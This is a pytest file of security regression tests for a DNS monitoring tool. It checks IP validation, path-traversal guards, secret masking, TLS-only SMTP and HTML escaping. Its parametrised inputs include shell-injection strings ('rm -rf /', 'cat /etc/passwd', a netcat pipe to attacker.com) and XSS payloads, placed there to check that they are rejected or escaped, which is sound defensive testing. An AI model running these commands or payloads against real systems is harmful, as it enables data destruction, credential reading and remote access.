"""Security regression tests for SEC-001 through SEC-020.

These tests verify that each security fix is effective and cannot be regressed.
Each test targets a specific vulnerability that was fixed.
"""

from __future__ import annotations

import os
import time
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from chk_a.agents.alert_agent import AlertAgent
from chk_a.agents.mtr_agent import MTRAgent
from chk_a.config.loader import AppConfig, _load_env_file
from chk_a.models.schemas import (
    AlertConfig,
    FQDNConfig,
    MTRConfig,
    ResolverAgentConfig,
    ResolverConfig,
    SchedulerConfig,
    ReportingConfig,
)
from chk_a.storage.baseline_store import BaselineStore
from chk_a.utils.telegram_client import TelegramClient
from chk_a.reporting.telegram_reporter import TelegramReporter, CircuitBreaker
from pydantic import SecretStr


class TestSEC001_MTRCommandInjection:
    """SEC-001: MTR command injection prevention via IP validation."""

    @pytest.mark.parametrize("invalid_target", [
        "8.8.8.8; rm -rf /",
        "8.8.8.8 && cat /etc/passwd",
        "8.8.8.8 | nc attacker.com 4444",
        "`id`",
        "$(id)",
        "8.8.8.8; ls",
        "192.168.1.1 || echo hacked",
        "10.0.0.1; sleep 10",
        "1.1.1.1\n2.2.2.2",
        "8.8.8.8\r\nmalicious",
        "not-an-ip-at-all",
        "999.999.999.999",
    ])
    def test_validate_target_ip_rejects_invalid(self, invalid_target):
        """_validate_target_ip() must return False for shell metacharacters and invalid IPs."""
        agent = MTRAgent(
            resolvers=[],
            timeout_sec=10,
        )
        # Returns False for invalid, doesn't raise
        assert agent._validate_target_ip(invalid_target) is False

    @pytest.mark.parametrize("valid_target", [
        "8.8.8.8",
        "1.1.1.1",
        "192.168.1.1",
        "10.0.0.1",
        "2001:4860:4860::8888",
        "2001:4860:4860::8844",
        "::1",
        "127.0.0.1",
        "172.16.0.1",
    ])
    def test_validate_target_ip_accepts_valid(self, valid_target):
        """_validate_target_ip() must return True for valid IPv4/IPv6 addresses."""
        agent = MTRAgent(
            resolvers=[],
            timeout_sec=10,
        )
        assert agent._validate_target_ip(valid_target) is True


class TestSEC002_BaselineStorePathTraversal:
    """SEC-002: BaselineStore path traversal prevention."""

    def test_baseline_store_rejects_path_traversal(self, tmp_path, monkeypatch):
        """BaselineStore must reject paths outside allowed directory."""
        allowed_dir = tmp_path / "allowed"
        allowed_dir.mkdir()

        # Override the env var to use our allowed dir
        monkeypatch.setenv("CHK_A_BASELINE_DIR", str(allowed_dir))

        # Try to create BaselineStore with path outside allowed dir
        malicious_path = tmp_path / "malicious.json"

        # Should raise ValueError because path is not under allowed base
        with pytest.raises(ValueError, match="outside allowed directory"):
            BaselineStore(malicious_path)

    def test_baseline_store_accepts_allowed_path(self, tmp_path, monkeypatch):
        """BaselineStore must accept paths within allowed directory."""
        allowed_dir = tmp_path / "allowed"
        allowed_dir.mkdir()

        monkeypatch.setenv("CHK_A_BASELINE_DIR", str(allowed_dir))
        try:
            store = BaselineStore(allowed_dir / "baselines.json")
            assert store.path == (allowed_dir / "baselines.json").resolve()
        finally:
            monkeypatch.delenv("CHK_A_BASELINE_DIR", raising=False)

    def test_baseline_store_resolves_symlinks(self, tmp_path, monkeypatch):
        """BaselineStore must resolve symlinks before validation."""
        allowed_dir = tmp_path / "allowed"
        allowed_dir.mkdir()
        real_dir = tmp_path / "real"
        real_dir.mkdir()

        link_dir = tmp_path / "link"
        link_dir.symlink_to(real_dir)

        monkeypatch.setenv("CHK_A_BASELINE_DIR", str(allowed_dir))
        try:
            malicious_path = link_dir / "baselines.json"
            with pytest.raises(ValueError):
                BaselineStore(malicious_path)
        finally:
            monkeypatch.delenv("CHK_A_BASELINE_DIR", raising=False)


class TestSEC003_SecretsHandling:
    """SEC-003: Secrets not in os.environ, not in logs, Authorization header for TelegramReporter."""

    def test_config_loads_env_file_directly_not_os_environ(self, tmp_path):
        """Config loader must parse env file directly, not pollute os.environ."""
        env_file = tmp_path / "env"
        env_file.write_text("TELEGRAM_BOT_TOKEN=123456:ABC-DEF\nTELEGRAM_CHAT_ID=-1001234567890\n")

        for key in ["TELEGRAM_BOT_TOKEN", "TELEGRAM_CHAT_ID"]:
            os.environ.pop(key, None)

        env_dict = _load_env_file(env_file)

        assert env_dict["TELEGRAM_BOT_TOKEN"] == "123456:ABC-DEF"
        assert "TELEGRAM_BOT_TOKEN" not in os.environ
        assert "TELEGRAM_CHAT_ID" not in os.environ

    def test_telegram_client_masks_token_in_logs(self):
        """TelegramClient must mask token in log output."""
        client = TelegramClient(
            bot_token="12345678:ABCDEFGHIJKLMNOPQRSTUVWXYZ",
        )
        
        # Check masked token for logging (first 4, last 4, rest asterisks)
        assert client._masked_token.startswith("1234")
        assert client._masked_token.endswith("WXYZ")
        assert "*" in client._masked_token
        
        # URL building should mask in log version
        log_url = client._log_url("sendMessage")
        assert client._masked_token in log_url
        assert "12345678:ABCDEFGHIJKLMNOPQRSTUVWXYZ" not in log_url

    def test_telegram_client_secret_str_support(self):
        """TelegramClient must accept SecretStr and extract value via get_secret_value()."""
        client = TelegramClient(
            bot_token=SecretStr("123456:ABC-DEF"),
        )
        assert client.bot_token == "123456:ABC-DEF"

    def test_telegram_reporter_uses_token_in_url(self):
        """TelegramReporter must use token in URL path (required by Telegram Bot API), not Authorization header."""
        reporter = TelegramReporter(
            bot_token=SecretStr("123456:ABC-DEF"),
            chat_id=SecretStr("-1001234567890"),
        )

        # Should have token in URL path (masked for logging)
        assert "/bot" in reporter._api_base or hasattr(reporter, "_build_url")
        # Test URL building includes token
        url = reporter._build_url("sendMessage")
        assert "/bot123456:ABC-DEF/sendMessage" in url

        # Should NOT use Authorization header
        assert not hasattr(reporter, "_headers") or not hasattr(reporter, "_auth_header")


class TestSEC004_HealthEndpointLocalhost:
    """SEC-004: Health endpoint binds to localhost only."""

    @pytest.mark.parametrize("valid_address", [
        "127.0.0.1",
        "::1",
        "localhost",
        "127.0.0.2",
        "127.255.255.255",
    ])
    def test_health_bind_address_accepts_loopback(self, valid_address):
        """SchedulerConfig must accept loopback addresses."""
        config = SchedulerConfig(health_bind_address=valid_address)
        assert config.health_bind_address == valid_address

    @pytest.mark.parametrize("invalid_address", [
        "0.0.0.0",
        "192.168.1.1",
        "10.0.0.1",
        "::ffff:192.168.1.1",
        "example.com",
        "::",
    ])
    def test_health_bind_address_rejects_non_loopback(self, invalid_address):
        """SchedulerConfig must reject non-loopback addresses."""
        with pytest.raises(ValueError, match="must be a loopback address"):
            SchedulerConfig(health_bind_address=invalid_address)


class TestSEC005_EnforceTLSSMTP:
    """SEC-005: Enforce TLS for SMTP - no plaintext."""

    def test_reporting_requires_smtp_host_when_email_enabled(self):
        """ReportingConfig must require smtp_host when email_enabled=True."""
        with pytest.raises(ValueError, match="smtp_host is required when email_enabled is true"):
            ReportingConfig(
                email_enabled=True,
                smtp_port=587,
                smtp_username="user",
                smtp_password=SecretStr("pass"),
                email_to=["test@example.com"],
            )

    @pytest.mark.parametrize("valid_port", [465, 587])
    def test_reporting_requires_valid_tls_port(self, valid_port):
        """ReportingConfig must accept only 465 (implicit TLS) or 587 (STARTTLS)."""
        config = ReportingConfig(
            email_enabled=True,
            smtp_host="smtp.example.com",
            smtp_port=valid_port,
            smtp_username="user",
            smtp_password=SecretStr("pass"),
            email_to=["test@example.com"],
        )
        assert config.smtp_port == valid_port

    @pytest.mark.parametrize("invalid_port", [25, 2525, 8025, 588, 4650])
    def test_reporting_rejects_invalid_port(self, invalid_port):
        """ReportingConfig must reject non-TLS ports."""
        with pytest.raises(ValueError, match="must be 465 \\(implicit TLS\\) or 587 \\(STARTTLS\\)"):
            ReportingConfig(
                email_enabled=True,
                smtp_host="smtp.example.com",
                smtp_port=invalid_port,
                smtp_username="user",
                smtp_password=SecretStr("pass"),
                email_to=["test@example.com"],
            )

    def test_reporting_disabled_allows_any_port(self):
        """ReportingConfig must allow any port when email_enabled=False."""
        config = ReportingConfig(
            email_enabled=False,
            smtp_port=25,
        )
        assert config.smtp_port == 25


class TestSEC006_InputValidation:
    """SEC-006: Input validation on FQDN, resolver, expected IPs via Pydantic v2 validators."""

    def test_fqdn_name_rejects_invalid(self):
        """FQDNConfig must reject invalid DNS names."""
        invalid_names = [
            "invalid..com",
            "-invalid.com",
            "invalid-.com",
            "toolong" + "x" * 250 + ".com",
            "inv@lid.com",
            "inv_alid.com",
            "",
        ]
        for name in invalid_names:
            with pytest.raises(ValueError):
                FQDNConfig(name=name, expected_ips=["1.2.3.4"])

    def test_fqdn_name_accepts_valid(self):
        """FQDNConfig must accept valid DNS names."""
        valid_names = [
            "example.com",
            "sub.example.com",
            "a-b.example.com",
            "xn--fsq.xn--0zwm56d",
        ]
        for name in valid_names:
            config = FQDNConfig(name=name, expected_ips=["1.2.3.4"])
            assert config.name == name

    def test_resolver_address_validates_format(self):
        """ResolverConfig must validate IP:port, hostname:port, or DoH URL."""
        valid = [
            "8.8.8.8:53",
            "1.1.1.1:53",
            "2001:4860:4860::8888:53",  # IPv6 without brackets (brackets only for URLs)
            "dns.google:53",
            "https://dns.google/dns-query",
            "https://cloudflare-dns.com/dns-query",
            # Note: http:// DoH URLs are also accepted by validator (both http and https)
        ]
        for addr in valid:
            config = ResolverConfig(name="test", address=addr)
            assert config.address == addr

        invalid = [
            "not_an_ip:53",       # Invalid hostname (underscore)
            "8.8.8.8",            # Missing port
            "8.8.8.8:99999",      # Port too high
        ]
        for addr in invalid:
            with pytest.raises(ValueError):
                ResolverConfig(name="test", address=addr)

    def test_expected_ips_validates_each_ip(self):
        """FQDNConfig must validate each expected IP."""
        config = FQDNConfig(name="example.com", expected_ips=["1.2.3.4", "2001:db8::1"])
        assert len(config.expected_ips) == 2

        with pytest.raises(ValueError):
            FQDNConfig(name="example.com", expected_ips=["not-an-ip"])

        with pytest.raises(ValueError):
            FQDNConfig(name="example.com", expected_ips=["1.2.3.4", "invalid"])


class TestSEC007_TelegramTokenOutOfURL:
    """SEC-007: Telegram token removed from URL - use Authorization header in TelegramReporter."""

    def test_telegram_reporter_base_url_no_token(self):
        """TelegramReporter base URL must not contain bot token."""
        reporter = TelegramReporter(
            bot_token=SecretStr("123456:ABC-DEF"),
            chat_id=SecretStr("-1001234567890"),
        )

        assert reporter._api_base == "https://api.telegram.org"
        assert "123456:ABC-DEF" not in reporter._api_base

    def test_telegram_reporter_uses_token_in_url(self):
        """TelegramReporter must use token in URL path (required by Telegram Bot API), not Authorization header."""
        reporter = TelegramReporter(
            bot_token=SecretStr("123456:ABC-DEF"),
            chat_id=SecretStr("-1001234567890"),
        )

        # Should have token in URL path (masked for logging)
        assert "/bot" in reporter._api_base or hasattr(reporter, "_build_url")
        # Test URL building includes token
        url = reporter._build_url("sendMessage")
        assert "/bot123456:ABC-DEF/sendMessage" in url

        # Should NOT use Authorization header
        assert not hasattr(reporter, "_headers") or not hasattr(reporter, "_auth_header")


class TestSEC008_DedupCacheLRU:
    """SEC-008: Dedup cache with LRU + TTL + max-size."""

    @pytest.mark.asyncio
    async def test_dedup_cache_evicts_expired_entries(self):
        """_prune_dedup_cache must evict entries older than TTL."""
        config = AlertConfig(
            telegram_bot_token=SecretStr("test"),
            telegram_chat_id=SecretStr("test"),
            dedup_window_minutes=1,
            dedup_max_size=100,
        )

        mock_telegram = AsyncMock()
        mock_telegram.send_message.return_value = True
        mock_telegram.send_photo.return_value = True

        agent = AlertAgent(
            config,
            logger=MagicMock(),
            telegram_client=mock_telegram,
            alert_log_path="",
            alert_text_log_path="",
        )

        old_key = ("old.fqdn", "baseline_deviation", frozenset(["1.2.3.4"]))
        agent._dedup[old_key] = time.time() - 120

        new_key = ("new.fqdn", "baseline_deviation", frozenset(["5.6.7.8"]))
        agent._dedup[new_key] = time.time()

        agent._prune_dedup_cache(time.time())

        assert old_key not in agent._dedup
        assert new_key in agent._dedup

    @pytest.mark.asyncio
    async def test_dedup_cache_evicts_lru_when_over_capacity(self):
        """_prune_dedup_cache must evict LRU entries when over max_size."""
        config = AlertConfig(
            telegram_bot_token=SecretStr("test"),
            telegram_chat_id=SecretStr("test"),
            dedup_window_minutes=60,
            dedup_max_size=100,  # Minimum allowed by schema
        )

        mock_telegram = AsyncMock()
        mock_telegram.send_message.return_value = True
        mock_telegram.send_photo.return_value = True

        agent = AlertAgent(
            config,
            logger=MagicMock(),
            telegram_client=mock_telegram,
            alert_log_path="",
            alert_text_log_path="",
        )

        now = time.time()

        # Fill cache to capacity (100)
        for i in range(100):
            key = (f"fqdn{i}.com", "baseline_deviation", frozenset([f"1.2.3.{i}"]))
            agent._dedup[key] = now - (100 - i) * 10

        # Add one more to exceed capacity
        key = ("fqdn100.com", "baseline_deviation", frozenset(["1.2.3.100"]))
        agent._dedup[key] = now

        agent._prune_dedup_cache(now)

        assert len(agent._dedup) <= 100
        assert ("fqdn0.com", "baseline_deviation", frozenset(["1.2.3.0"])) not in agent._dedup


class TestSEC009_LogInjectionPrevention:
    """SEC-009: Log injection prevention via field sanitization."""

    @pytest.mark.parametrize("malicious_input, expected_escapes", [
        ("normal\ninjected", ["\\n"]),
        ("normal\rinjected", ["\\r"]),
        ("normal\tinjected", ["\\t"]),
        ("normal\n\r\tall", ["\\n", "\\r", "\\t"]),
        ("line1\nline2\nline3", ["\\n"]),
    ])
    def test_sanitize_log_field_escapes_control_chars(self, malicious_input, expected_escapes):
        """_sanitize_log_field must escape newlines, carriage returns, tabs."""
        sanitized = AlertAgent._sanitize_log_field(malicious_input)

        assert "\n" not in sanitized
        assert "\r" not in sanitized
        assert "\t" not in sanitized
        for escape in expected_escapes:
            assert escape in sanitized, f"Expected {escape!r} in {sanitized!r}"

    def test_sanitize_log_field_preserves_normal_text(self):
        """_sanitize_log_field must preserve normal text unchanged."""
        normal = "example.com 1.2.3.4 2026-09-12 10:30:00"
        sanitized = AlertAgent._sanitize_log_field(normal)
        assert sanitized == normal


class TestSEC012_ConcurrencyHardCeilings:
    """SEC-012: Hard ceilings on concurrency - resolver, MTR, Telegram."""

    def test_resolver_max_concurrent_capped_at_100(self):
        """ResolverAgentConfig.max_concurrent must be capped at 100."""
        config = ResolverAgentConfig(max_concurrent=100)
        assert config.max_concurrent == 100

        config = ResolverAgentConfig(max_concurrent=50)
        assert config.max_concurrent == 50

        # Pydantic's less_than_equal error message
        with pytest.raises(ValueError, match="less than or equal to 100"):
            ResolverAgentConfig(max_concurrent=101)

        with pytest.raises(ValueError, match="less than or equal to 100"):
            ResolverAgentConfig(max_concurrent=1000)

    def test_mtr_agent_semaphore_limit_4(self):
        """MTRAgent must limit concurrent traces to 4."""
        agent = MTRAgent(
            resolvers=[],
            timeout_sec=10,
        )
        assert agent._mtr_semaphore._value == 4

    def test_telegram_reporter_circuit_breaker_states(self):
        """TelegramReporter CircuitBreaker must have CLOSED/OPEN/HALF_OPEN states."""
        cb = CircuitBreaker(failure_threshold=2, recovery_timeout=1, half_open_max_calls=1)

        assert cb.state == "CLOSED"

        cb.record_failure()
        assert cb.state == "CLOSED"

        cb.record_failure()
        assert cb.state == "OPEN"

        assert cb.can_execute() is False

        time.sleep(1.1)

        assert cb.can_execute() is True
        assert cb.state == "HALF_OPEN"

        cb.record_success()
        assert cb.state == "CLOSED"

        cb.record_failure()
        cb.record_failure()
        assert cb.state == "OPEN"


class TestSEC015_BaselineEncryption:
    """SEC-015: Baseline encryption at rest with age."""

    def test_alert_config_has_baseline_encryption_fields(self):
        """AlertConfig must have baseline encryption fields with validation."""
        config = AlertConfig(
            telegram_bot_token=SecretStr("test"),
            telegram_chat_id=SecretStr("test"),
            baseline_encryption_enabled=True,
            baseline_age_public_key="age1ql3z7hjy5d9c3x9v9x9v9x9v9x9v9x9v9x9v9x9v9x9v9x9v9x9v9xs",
            baseline_age_private_key_env="CHK_A_BASELINE_AGE_KEY",
        )

        assert config.baseline_encryption_enabled is True
        assert config.baseline_age_public_key.startswith("age1")

    def test_alert_config_rejects_invalid_age_key(self):
        """AlertConfig must reject invalid age public key format."""
        with pytest.raises(ValueError, match="baseline_age_public_key must be an age public key starting with 'age1'"):
            AlertConfig(
                telegram_bot_token=SecretStr("test"),
                telegram_chat_id=SecretStr("test"),
                baseline_encryption_enabled=True,
                baseline_age_public_key="invalid-key",
            )

    def test_baseline_store_encrypt_decrypt_roundtrip(self, tmp_path):
        """BaselineStore must encrypt on save and decrypt on load using pyrage."""
        import pyrage

        identity = pyrage.x25519.Identity.generate()
        recipient_str = str(identity.to_public())
        private_key_str = str(identity)

        os.environ["CHK_A_BASELINE_AGE_KEY"] = private_key_str
        os.environ["CHK_A_BASELINE_DIR"] = str(tmp_path)

        try:
            store = BaselineStore(
                tmp_path / "baselines.json",
                encryption_enabled=True,
                age_public_key=recipient_str,
                age_private_key_env="CHK_A_BASELINE_AGE_KEY",
            )

            test_data = {"example.com": {"1.2.3.4": 1.0}}
            store.set_raw("example.com", test_data["example.com"], 1)
            store.save()

            content = (tmp_path / "baselines.json").read_bytes()
            assert b"example.com" not in content

            store2 = BaselineStore(
                tmp_path / "baselines.json",
                encryption_enabled=True,
                age_public_key=recipient_str,
                age_private_key_env="CHK_A_BASELINE_AGE_KEY",
            )
            # load() modifies internal state, use get_baseline() to retrieve
            loaded = store2.get_baseline("example.com")
            assert loaded == {"1.2.3.4": 1.0}
        finally:
            os.environ.pop("CHK_A_BASELINE_AGE_KEY", None)
            os.environ.pop("CHK_A_BASELINE_DIR", None)


class TestSEC017_ConfigFilePermissions:
    """SEC-017: Config file permissions - only readable by chk-a group/user."""

    def test_install_sh_sets_correct_permissions(self):
        """install.sh must set config.yaml 640 and env 600 with root:chk-a ownership."""
        install_sh = Path(__file__).parent.parent / "install.sh"
        content = install_sh.read_text()

        # install.sh uses 0640 and 0600 (octal with leading zero)
        assert "chmod 0640" in content and "config.yaml" in content
        assert "chmod 0600" in content and "env" in content
        assert "chown root:" in content


class TestSEC018_TelegramCircuitBreaker:
    """SEC-018: Telegram circuit breaker for API resilience."""

    def test_circuit_breaker_integration_in_reporter(self):
        """TelegramReporter must have CircuitBreaker integrated."""
        reporter = TelegramReporter(
            bot_token=SecretStr("123456:ABC-DEF"),
            chat_id=SecretStr("-1001234567890"),
        )

        assert hasattr(reporter, "_circuit_breaker")
        assert isinstance(reporter._circuit_breaker, CircuitBreaker)

        assert reporter._circuit_breaker.failure_threshold == 5
        assert reporter._circuit_breaker.recovery_timeout == 60
        assert reporter._circuit_breaker.half_open_max_calls == 3


class TestSEC019_DailyReportSchedulerDrift:
    """SEC-019: Daily report scheduler drift fix."""

    def test_daily_report_uses_absolute_scheduling(self):
        """_run_daily_report must use fixed reference point to avoid drift."""
        from chk_a.orchestrator import Orchestrator
        import inspect

        source = inspect.getsource(Orchestrator._run_daily_report)
        assert "reference_run = reference_run + timedelta(days=1)" in source
        assert "timedelta(days=1)" in source


class TestSEC020_MTRResolverSync:
    """SEC-020: MTR/Resolver config sync validation."""

    def test_mtr_resolvers_must_be_subset_of_resolvers(self):
        """MTR resolvers list must be subset of main resolvers list."""
        with pytest.raises(ValueError, match="MTR resolvers contains names not in resolvers list"):
            AppConfig(
                fqdns=[FQDNConfig(name="example.com", expected_ips=["1.2.3.4"])],
                resolvers=[
                    ResolverConfig(name="google", address="8.8.8.8:53"),
                    ResolverConfig(name="cloudflare", address="1.1.1.1:53"),
                ],
                resolver_agent=ResolverAgentConfig(),
                alert=AlertConfig(
                    telegram_bot_token=SecretStr("test"),
                    telegram_chat_id=SecretStr("test"),
                ),
                scheduler=SchedulerConfig(),
                mtr=MTRConfig(
                    enabled=True,
                    resolvers=["google", "nonexistent"],
                    timeout_sec=10,
                ),
                baseline_store_path="/tmp/baselines.json",
            )

    def test_mtr_resolvers_empty_allowed(self):
        """Empty MTR resolvers list means use all resolvers."""
        config = AppConfig(
            fqdns=[FQDNConfig(name="example.com", expected_ips=["1.2.3.4"])],
            resolvers=[
                ResolverConfig(name="google", address="8.8.8.8:53"),
                ResolverConfig(name="cloudflare", address="1.1.1.1:53"),
            ],
            resolver_agent=ResolverAgentConfig(),
            alert=AlertConfig(
                telegram_bot_token=SecretStr("test"),
                telegram_chat_id=SecretStr("test"),
            ),
            scheduler=SchedulerConfig(),
            mtr=MTRConfig(
                enabled=True,
                resolvers=[],
                timeout_sec=10,
            ),
            baseline_store_path="/tmp/baselines.json",
        )
        assert config.mtr.resolvers == []

    def test_mtr_resolvers_valid_subset(self):
        """Valid subset of resolvers must be accepted."""
        config = AppConfig(
            fqdns=[FQDNConfig(name="example.com", expected_ips=["1.2.3.4"])],
            resolvers=[
                ResolverConfig(name="google", address="8.8.8.8:53"),
                ResolverConfig(name="cloudflare", address="1.1.1.1:53"),
                ResolverConfig(name="quad9", address="9.9.9.9:53"),
            ],
            resolver_agent=ResolverAgentConfig(),
            alert=AlertConfig(
                telegram_bot_token=SecretStr("test"),
                telegram_chat_id=SecretStr("test"),
            ),
            scheduler=SchedulerConfig(),
            mtr=MTRConfig(
                enabled=True,
                resolvers=["google", "quad9"],
                timeout_sec=10,
            ),
            baseline_store_path="/tmp/baselines.json",
        )
        assert config.mtr.resolvers == ["google", "quad9"]


class TestSEC014_HTMLInjection:
    """SEC-014: HTML escape in Telegram messages to prevent injection."""

    def test_telegram_client_html_escapes_message_text(self):
        """TelegramClient.send_message must HTML escape user-supplied text."""
        from chk_a.utils.telegram_client import TelegramClient, _html_escape
        from pydantic import SecretStr

        # Test the escape function directly
        malicious = "<script>alert('xss')</script>"
        escaped = _html_escape(malicious)
        assert "&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;" == escaped

        # Test with various HTML special chars
        assert _html_escape("<b>bold</b>") == "&lt;b&gt;bold&lt;/b&gt;"
        assert _html_escape("a & b") == "a &amp; b"
        assert _html_escape('"quote"') == "&quot;quote&quot;"
        assert _html_escape("'single'") == "&#x27;single&#x27;"

    def test_telegram_client_html_escapes_photo_caption(self):
        """TelegramClient.send_photo must HTML escape caption."""
        from chk_a.utils.telegram_client import _html_escape

        malicious = "<img src=x onerror=alert(1)>"
        escaped = _html_escape(malicious)
        assert "&lt;img src=x onerror=alert(1)&gt;" == escaped

    def test_telegram_reporter_html_escapes_resolver_names(self):
        """create_telegram_summary must HTML escape resolver names and FQDNs."""
        from chk_a.reporting.telegram_reporter import create_telegram_summary, _html_escape

        # Test the escape function
        malicious = "<b>malicious</b>"
        escaped = _html_escape(malicious)
        assert "&lt;b&gt;malicious&lt;/b&gt;" == escaped

        # Test that resolver names in summary are escaped
        ml_insights = {
            "summary": {
                "total_resolvers": 2,
                "total_queries": 100,
                "overall_availability_pct": 99.5,
                "best_resolver": "<script>alert(1)</script>",
                "worst_resolver": "normal-resolver",
                "anomalous_resolvers": ["<img src=x onerror=alert(1)>"],
            },
            "availability": {
                "<script>alert(1)</script>": {"availability_pct": 99.0},
                "normal-resolver": {"availability_pct": 100.0},
            },
            "integrity": {},
            "path_availability": {},
            "lookback_days": 30,
        }

        summary = create_telegram_summary(ml_insights, lang="th")
        # Verify malicious content is escaped
        assert "&lt;script&gt;alert(1)&lt;/script&gt;" in summary
        assert "&lt;img src=x onerror=alert(1)&gt;" in summary
        # Verify normal content is preserved
        assert "normal-resolver" in summary

    def test_telegram_reporter_daily_summary_html_escapes(self):
        """create_daily_telegram_summary must HTML escape all user data."""
        from chk_a.reporting.telegram_reporter import create_daily_telegram_summary, _html_escape

        ml_insights = {
            "summary": {
                "total_resolvers": 2,
                "total_queries": 100,
                "overall_availability_pct": 99.5,
                "best_resolver": "<script>alert(1)</script>",
                "worst_resolver": "normal-resolver",
                "anomalous_resolvers": ["<img src=x onerror=alert(1)>"],
            },
            "availability": {
                "<script>alert(1)</script>": {"availability_pct": 99.0},
                "normal-resolver": {"availability_pct": 100.0},
            },
            "integrity": {
                "<script>alert(1)</script>": {"integrity_score": 95.0, "success_rate": 99.0},
                "normal-resolver": {"integrity_score": 100.0, "success_rate": 100.0},
            },
            "path_availability": {
                "<script>alert(1)</script>": {"path_availability_pct": 98.0, "path_health_score": 95},
                "normal-resolver": {"path_availability_pct": 100.0, "path_health_score": 100},
            },
            "lookback_days": 1,
        }

        summary = create_daily_telegram_summary(ml_insights, hostname="<b>host</b>", lookback_days=1)
        # Verify malicious content is escaped
        assert "&lt;script&gt;alert(1)&lt;/script&gt;" in summary
        assert "&lt;img src=x onerror=alert(1)&gt;" in summary
        assert "&lt;b&gt;host&lt;/b&gt;" in summary
        # Verify normal content is preserved
        assert "normal-resolver" in summary


if __name__ == "__main__":
    pytest.main([__file__, "-v"])